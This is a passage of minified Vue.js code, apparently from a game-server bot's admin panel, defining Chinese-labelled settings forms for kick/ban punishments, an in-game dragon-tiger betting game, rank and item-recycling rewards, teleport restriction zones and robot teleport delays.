){e.$set(e.settingsForm,"IllegalAdminCommandPunishmentType",t)},expression:"settingsForm.IllegalAdminCommandPunishmentType"}},[i("a-select-option",{key:0},[e._v("甩到半空中摔死")]),i("a-select-option",{key:1},[e._v('立即踢出服务器(#Kick "Steam ID")')]),i("a-select-option",{key:2},[e._v('立即Ban出服务器(#Ban "Steam ID")')])],1)],1),i("a-form-model-item",{attrs:{label:"比大小配置","label-col":{span:10},"wrapper-col":{span:14},prop:"LHDConfigs"}},[i("div",{staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("最低打赌美金:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.minPrice,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"minPrice",t)},expression:"settingsForm.LHDConfigs.minPrice"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("猜中龙奖金倍率:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.dragonWinMultiples,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"dragonWinMultiples",t)},expression:"settingsForm.LHDConfigs.dragonWinMultiples"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("猜中虎奖金倍率:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.tigerWinMultiples,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"tigerWinMultiples",t)},expression:"settingsForm.LHDConfigs.tigerWinMultiples"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("猜中豹奖金倍率:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.leopardWinMultiples,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"leopardWinMultiples",t)},expression:"settingsForm.LHDConfigs.leopardWinMultiples"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("猜中和奖金倍率:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.equalWinMultiples,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"equalWinMultiples",t)},expression:"settingsForm.LHDConfigs.equalWinMultiples"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"120px","text-align":"right","padding-right":"10px"}},[e._v("和局返还倍率:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.LHDConfigs.equalDeductMultiples,callback:function(t){e.$set(e.settingsForm.LHDConfigs,"equalDeductMultiples",t)},expression:"settingsForm.LHDConfigs.equalDeductMultiples"}})],1)])]),i("a-form-model-item",{attrs:{label:"军衔配置","label-col":{span:10},"wrapper-col":{span:14},prop:"MilitaryLevelConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.MilitaryLevelConfigs.push({levelId:"",level:"",prices:[]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.MilitaryLevelConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"MilitaryLevelConfigs",!e.expander.MilitaryLevelConfigs)}}},[e._v(e._s(e.expander.MilitaryLevelConfigs?"隐藏":"显示"))])],1),e.expander.MilitaryLevelConfigs?e._l(e.settingsForm.MilitaryLevelConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("等级ID:")]),i("a-input",{staticStyle:{width:"calc(100% - 125px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.levelId,callback:function(i){e.$set(t,"levelId",i)},expression:"config.levelId"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.MilitaryLevelConfigs.splice(a,1)}}},[e._v("移除 ")])],1),i("div",[i("span",[e._v("等级:")]),i("a-input",{staticStyle:{width:"calc(100% - 38px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.level,callback:function(i){e.$set(t,"level",i)},expression:"config.level"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{display:"inline-block","vertical-align":"top"}},[e._v("价格策略:")]),i("a-button",{staticStyle:{"margin-left":"5px"},attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.prices.push({validDays:"",price:""})}}},[e._v("添加 ")]),e._l(t.prices,(function(a,n){return i("div",{key:n},[i("div",{staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("有效天数(0为永久):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 205px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0,precision:0},model:{value:a.validDays,callback:function(t){e.$set(a,"validDays",t)},expression:"price.validDays"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.prices.splice(n,1)}}},[e._v("移除 ")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("价格:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit,min:0},model:{value:a.price,callback:function(t){e.$set(a,"price",t)},expression:"price.price"}})],1)])])}))],2)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"物资回收配置","label-col":{span:10},"wrapper-col":{span:14},prop:"ResourceRecycleConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.ResourceRecycleConfigs.push({title:"",items:[],actions:[]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.ResourceRecycleConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"ResourceRecycleConfigs",!e.expander.ResourceRecycleConfigs)}}},[e._v(e._s(e.expander.ResourceRecycleConfigs?"隐藏":"显示"))]),e.expander.ResourceRecycleConfigs?e._l(e.settingsForm.ResourceRecycleConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("回收类型名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 175px)","margin-left":"10px"},attrs:{disabled:!e.edit},model:{value:t.title,callback:function(i){e.$set(t,"title",i)},expression:"config.title"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.ResourceRecycleConfigs.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px","vertical-align":"top"}},[e._v("目标物品:")]),i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.items.push({type:"",number:1})}}},[e._v("添加 ")]),e._l(t.items,(function(a,n){return i("div",{key:n,staticStyle:{display:"inline-block","vertical-align":"top",width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("物品指令名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 170px)","margin-left":"10px"},attrs:{disabled:!e.edit},model:{value:a.type,callback:function(t){e.$set(a,"type",t)},expression:"item.type"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.items.splice(n,1)}}},[e._v("移除 ")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"97px","text-align":"right","padding-right":"10px"}},[e._v("数量:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 97px)"},attrs:{disabled:!e.edit,min:1},model:{value:a.number,callback:function(t){e.$set(a,"number",t)},expression:"item.number"}})],1)])}))],2),i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px","vertical-align":"top"}},[e._v("动作类型:")]),i("a-dropdown",[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"}},[e._v("添加")]),i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[void 0===t.actions.find((function(e){return"command"===e.configType}))?i("a-menu-item",{key:"command",on:{click:function(){t.actions.push({configType:"command",commands:"",isTeleport:!0,noTeleportMode:"mode1"})}}},[e._v("生成命令的商品")]):e._e(),void 0===t.actions.find((function(e){return"dollar"===e.configType}))?i("a-menu-item",{key:"dollar",on:{click:function(){t.actions.push({configType:"dollar",dollar:0})}}},[e._v("美金")]):e._e(),void 0===t.actions.find((function(e){return"vip"===e.configType}))?i("a-menu-item",{key:"vip",on:{click:function(){t.actions.push({configType:"vip",level:null,levelExpireDays:0})}}},[e._v("会员等级")]):e._e(),void 0===t.actions.find((function(e){return"military"===e.configType}))?i("a-menu-item",{key:"military",on:{click:function(){t.actions.push({configType:"military",militaryLevel:null,militaryLevelExpireDays:0})}}},[e._v("军衔等级")]):e._e()],1)],1),e._l(t.actions,(function(a,n){return i("div",{key:n,staticStyle:{display:"inline-block","vertical-align":"top",width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},["command"===a.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放方式:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:a.isTeleport,callback:function(t){e.$set(a,"isTeleport",t)},expression:"action.isTeleport"}},[i("a-radio",{attrs:{value:!0}},[e._v("需要传送")]),i("a-radio",{attrs:{value:!1}},[e._v("不需要传送")])],1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.actions.splice(n,1)}}},[e._v("移除 ")])],1),!1===a.isTeleport?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("隔空刷货的格式")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit||!0===a.isTeleport},model:{value:a.noTeleportMode,callback:function(t){e.$set(a,"noTeleportMode",t)},expression:"action.noTeleportMode"}},[i("a-radio",{attrs:{disabled:!e.edit||!0===a.isTeleport,value:"mode1"}},[e._v("模式一")]),i("a-radio",{attrs:{disabled:!0,value:"mode2"}},[e._v("模式二")]),i("a-radio",{attrs:{disabled:!e.edit||!0===a.isTeleport,value:"mode3"}},[e._v("模式三")])],1)],1):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("生成命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer","vertical-align":"top",transform:"translateY(13px)"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",{staticStyle:{"margin-left":"4px","vertical-align":"top"}},[e._v(":")]),i("div",{staticStyle:{width:"calc(100% - 85px)","margin-left":"5px",position:"relative",display:"inline-block"}},[i("a-input",{staticStyle:{width:"100%"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"每一条内容以回车换行隔开"},model:{value:a.commands,callback:function(t){e.$set(a,"commands",t)},expression:"action.commands"}}),e.edit?i("commands-picker",{on:{select:function(e,t){a.commands=a.commands+(a.commands.length?"\n":"")+e+("number"==typeof t&&t>=2?t<=10?" "+t:" 10":"")}}}):e._e()],1)],1)]:"dollar"===a.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("赠送美金数量:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 165px)","margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:a.dollar,callback:function(t){e.$set(a,"dollar",t)},expression:"action.dollar"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.actions.splice(n,1)}}},[e._v("移除 ")])],1)]:"vip"===a.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:a.level,callback:function(t){e.$set(a,"level",t)},expression:"action.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.actions.splice(n,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:a.levelExpireDays,callback:function(t){e.$set(a,"levelExpireDays",t)},expression:"action.levelExpireDays"}})],1)]:"military"===a.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:a.militaryLevelId,callback:function(t){e.$set(a,"militaryLevelId",t)},expression:"action.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.actions.splice(n,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:a.militaryLevelExpireDays,callback:function(t){e.$set(a,"militaryLevelExpireDays",t)},expression:"action.militaryLevelExpireDays"}})],1)]:e._e()],2)}))],2)])})):e._e()],2)]),i("a-form-model-item",{attrs:{"label-col":{span:10},"wrapper-col":{span:14},prop:"TeleportLimitaions"}},[i("template",{slot:"label"},[i("span",[e._v("传送限制策略")]),i("a-tooltip",{attrs:{placement:"top",title:"指定区域内禁止执行传送，区分传入限制和传出限制，仅传送相关功能生效，影响范围：区域传送、选点传送、热点传送、队友传送、梁山好汉等"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.TeleportLimitaions.push({type:"",ranges:[],vips:[]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.TeleportLimitaions?"up":"down"},on:{click:function(){e.$set(e.expander,"TeleportLimitaions",!e.expander.TeleportLimitaions)}}},[e._v(e._s(e.expander.TeleportLimitaions?"隐藏":"显示"))]),e.expander.TeleportLimitaions?e._l(e.settingsForm.TeleportLimitaions,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("限制类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.type,callback:function(i){e.$set(t,"type",i)},expression:"config.type"}},[i("a-radio",{attrs:{value:"teleportFrom"}},[e._v("传送人所在坐标")]),i("a-radio",{attrs:{value:"teleportTo"}},[e._v("传送目的坐标")])],1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.TeleportLimitaions.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("VIP适用范围:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{mode:"multiple",disabled:!e.edit},model:{value:t.vips,callback:function(i){e.$set(t,"vips",i)},expression:"config.vips"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px","vertical-align":"top"}},[e._v("坐标范围:")]),i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.ranges.push({fromXY:{x:"",y:""},toXY:{x:"",y:""}})}}},[e._v("添加")]),e._l(t.ranges,(function(a,n){return i("div",{key:n,staticStyle:{display:"inline-block","vertical-align":"top",width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("strong",[e._v("范围"+e._s(n+1))]),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.ranges.splice(n,1)}}},[e._v("移除")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("左上角XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:a.fromXY.x,callback:function(t){e.$set(a.fromXY,"x",t)},expression:"range.fromXY.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:a.fromXY.y,callback:function(t){e.$set(a.fromXY,"y",t)},expression:"range.fromXY.y"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("右下角XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:a.toXY.x,callback:function(t){e.$set(a.toXY,"x",t)},expression:"range.toXY.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:a.toXY.y,callback:function(t){e.$set(a.toXY,"y",t)},expression:"range.toXY.y"}})],1)])}))],2)])})):e._e()],2)],2)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,null,null).exports),Ea={name:"TeleportSettings",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{show:!1,loading:!1,edit:!1,saveLoading:!1,settingsForm:{EnableBanOfflineRobotQueue:!1,EnableRobotStableMode:!1,DelayAfterTeleportToPlayer:null,DelayAfterNormalCommand:null,DelayAfterLocatePlayer:null,DelayAfterListPlayers:null,DelayAfterListSpawnedVehicles:null,TeleportBackLocation:"",GameServerRestartBeforeAfterProtectTime:{before:null,after:null},RobotRPYConfig:{R:null,P:null,Y:null}},settingsFormRules:{EnableBanOfflineRobotQueue:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableRobotStableMode:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],DelayAfterTeleportToPlayer:[{required:!0,trigger:"change",message:"请输入时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入时间"))}}],DelayAfterLocatePlayer:[{required:!0,trigger:"change",message:"请输入时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入时间"))}}],DelayAfterListPlayers:[{required:!0,trigger:"change",message:"请输入时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入时间"))}}],DelayAfterListSpawnedVehicles:[{required:!0,trigger:"change",message:"请输入时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入时间"))}}],DelayAfterNormalCommand:[{required:!0,trigger:"change",message:"请输入时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入时间"))}}],TeleportBackLocation:[{required:!0,trigger:"change",message:"请正确输入机器人传送后回到的位置(名称不能重复，坐标为三个数字，以空格隔开)",validator:function(e,t,i){3===t.split(" ").length&&void 0===t.split(" ").find((function(e){return isNaN(parseFloat(e))}))?i():i(new Error("请正确输入机器人传送后回到的位置(名称不能重复，坐标为三个数字，以空格隔开)"))}}]}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/teleportSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&e.$set(e,"settingsForm",i.data),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=20;break}return a=Object(A.cloneDeep)(e.settingsForm),console.log(a),e.saveLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/serverConfigAdminSys/updateTeleportSettings",data:a});case 7:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=14;break}return e.$message.success("修改成功"),e.edit=!1,t.next=14,e.getData();case 14:t.next=20;break;case 16:t.prev=16,t.t0=t.catch(4),console.error(t.t0),e.saveLoading=!1;case 20:case"end":return t.stop()}}),t,null,[[4,16]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()}}},Pa=(i("2735"),Object(S.a)(Ea,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("机器人传送设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%","min-height":"350px",position:"relative",background:"white","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"750px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:8},"wrapper-col":{span:16}}},[i("a-form-model-item",{attrs:{label:"非传送命令/消息间隔(ms)",prop:"DelayAfterNormalCommand"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DelayAfterNormalCommand,callback:function(t){e.$set(e.settingsForm,"DelayAfterNormalCommand",t)},expression:"settingsForm.DelayAfterNormalCommand"}})],1),i("a-form-model-item",{attrs:{label:"传送玩家后下一次输入延迟(ms)",prop:"DelayAfterTeleportToPlayer"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DelayAfterTeleportToPlayer,callback:function(t){e.$set(e.settingsForm,"DelayAfterTeleportToPlayer",t)},expression:"settingsForm.DelayAfterTeleportToPlayer"}})],1),i("a-form-model-item",{attrs:{label:"#Location指令后等待的延迟(ms)",prop:"DelayAfterLocatePlayer"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DelayAfterLocatePlayer,callback:function(t){e.$set(e.settingsForm,"DelayAfterLocatePlayer",t)},expression:"settingsForm.DelayAfterLocatePlayer"}})],1),i("a-form-model-item",{attrs:{label:"#Listplayers指令后等待的延迟(ms)",prop:"DelayAfterListPlayers"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DelayAfterListPlayers,callback:function(t){e.$set(e.settingsForm,"DelayAfterListPlayers",t)},expression:"settingsForm.DelayAfterListPlayers"}})],1),i("a-form-model-item",{attrs:{label:"#ListVehicles指令后等待的延迟(ms)",prop:"DelayAfterListSpawnedVehicles"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.DelayAfterListSpawnedVehicles,callback:function(t){e.$set(e.settingsForm,"DelayAfterListSpawnedVehicles",t)},expression:"settingsForm.DelayAfterListSpawnedVehicles"}})],1),i("a-form-model-item",{attrs:{label:"机器人传送后回到的位置",prop:"TeleportBackLocation"}},[i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.TeleportBackLocation,callback:function(t){e.$set(e.settingsForm,"TeleportBackLocation",t)},expression:"settingsForm.TeleportBackLocation"}})],1),i("a-form-model-item",{attrs:{label:"服务器重启前后保护时间(分钟)",prop:"GameServerRestartBeforeAfterProtectTime"}},[i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"50px","text-align":"right"}},[e._v("重启前:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 